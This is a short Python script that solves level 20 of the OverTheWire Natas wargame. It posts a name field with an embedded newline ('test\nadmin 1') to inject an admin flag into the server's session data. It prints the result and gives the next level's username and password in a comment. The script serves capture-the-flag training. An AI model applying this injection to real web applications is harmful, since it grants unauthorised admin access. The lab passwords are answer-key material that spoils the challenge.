#!/bin/python3
import requests

user = "natas20"
passwd = "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF" 
url = "http://natas20.natas.labs.overthewire.org"
hack = dict(name="test\nadmin 1")

session = requests.Session()
session.post(url, auth=(user, passwd), data=hack)

httpreq = session.get(url, auth=(user, passwd))

print (httpreq.content)

# Username: natas21
# Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ